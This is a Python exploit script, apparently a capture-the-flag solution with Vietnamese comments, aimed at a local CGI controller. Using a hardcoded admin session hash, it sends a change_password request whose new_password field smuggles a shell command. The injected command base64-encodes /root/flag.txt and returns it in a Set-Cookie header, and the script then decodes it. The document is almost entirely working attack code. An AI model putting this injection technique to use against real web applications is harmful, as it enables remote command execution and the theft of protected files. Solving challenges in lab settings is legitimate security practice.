#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import base64
import sys
from urllib.parse import urljoin

# ==== CONFIG ====
BASE_URL   = "http://localhost:8089/"
CGI_PATH   = "cgi-bin/controller.cgi"
ADMIN_HASH = r"$y$j9T$ZluYEsUG3OBZh9SwByBwq1$q/7RoBQiOMhzZe7LG2J45c5ah4plFvFsVpVa74PAIvC"   # <<< DÁN full hash $y$... của admin vào đây

def u(path): return urljoin(BASE_URL, path.lstrip("/"))

def check_admin():
    r = requests.get(u(CGI_PATH),
                     params={"action": "check_session", "session": ADMIN_HASH},
                     timeout=8)
    ok = ("admin" in r.text)
    print(f"[check_session] HTTP {r.status_code}, admin={ok}")
    return ok

def inject_and_grab_cookie():
    new_password = r"'; printf 'Set-Cookie: F='; base64 /root/flag.txt | tr -d '\n'; printf '\r\n'; #"

    r = requests.get(
        u(CGI_PATH),
        params={
            "action": "change_password",
            "session": ADMIN_HASH,
            "users": "admin",   # hay 'guest' cũng được; vòng lặp vẫn chạy lệnh
            "new_password": new_password,
        },
        allow_redirects=False,   # giữ nguyên 302 + headers
        timeout=10,
    )
    print(f"[inject] HTTP {r.status_code}, Location={r.headers.get('Location')!r}")

    cookies = r.headers.get_all("Set-Cookie") if hasattr(r.headers, "get_all") else r.headers.get("Set-Cookie", "")
    if not cookies:
        print("[!] Không thấy header Set-Cookie nào. Có thể lệnh không chạy hoặc server strip header.", file=sys.stderr)
        return None

    if isinstance(cookies, str):
        cookies = [cookies]

    flag_b64 = ""
    for h in cookies:
        # ví dụ: "F=VEhJU19JU19GTEFHLgo=; path=/"
        parts = [p.strip() for p in h.split(";")]
        if parts and parts[0].startswith("F="):
            flag_b64 += parts[0][2:]  # nối nếu chia nhiều header (hiếm)
    return flag_b64 or None

def main():
    b64 = inject_and_grab_cookie()

    try:
        flag = base64.b64decode(b64.encode()).decode(errors="ignore").strip()
        if flag:
            print("\n[FLAG]\n" + flag)
        else:
            print("[!] Header F= rỗng sau khi decode.", file=sys.stderr)
            sys.exit(3)
    except Exception as e:
        print(f"[!] Decode base64 thất bại: {e}", file=sys.stderr)
        print(f"    Raw F= {b64!r}", file=sys.stderr)
        sys.exit(4)

if __name__ == "__main__":
    main()
